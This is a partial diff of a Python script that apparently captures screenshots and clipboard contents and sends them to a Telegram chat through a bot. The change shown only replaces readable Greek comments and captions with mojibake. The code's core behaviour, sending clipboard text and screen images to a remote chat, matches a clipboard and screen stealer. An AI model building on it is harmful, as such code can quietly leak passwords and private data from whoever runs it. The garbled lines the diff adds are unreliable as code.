@@ -10,7 +10,7 @@ from io import BytesIO
 TOKEN = os.environ.get("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
 
-INTERVAL = 1800  # 30 λεπτά
+INTERVAL = 1800  # 30 Î»ÎµÏ€Ï„Î¬
 LAST_IMG_HASH = None
 LAST_CLIP_HASH = None
 bot = telebot.TeleBot(TOKEN)
@@ -29,10 +29,10 @@ def get_clipboard_hash():
         return None, None
 
 def send_screenshot(img_bytes):
-    bot.send_photo(CHAT_ID, img_bytes, caption="📸 Νέο screenshot εντοπίστηκε")
+    bot.send_photo(CHAT_ID, img_bytes, caption="ðŸ“¸ ÎÎ­Î¿ screenshot ÎµÎ½Ï„Î¿Ï€Î¯ÏƒÏ„Î·ÎºÎµ")
 
 def send_clipboard(text):
-    bot.send_message(CHAT_ID, f"📋 Νέο Clipboard:\n{text[:4000]}")
+    bot.send_message(CHAT_ID, f"ðŸ“‹ ÎÎ­Î¿ Clipboard:\n{text[:4000]}")
 
 while True:
     try:
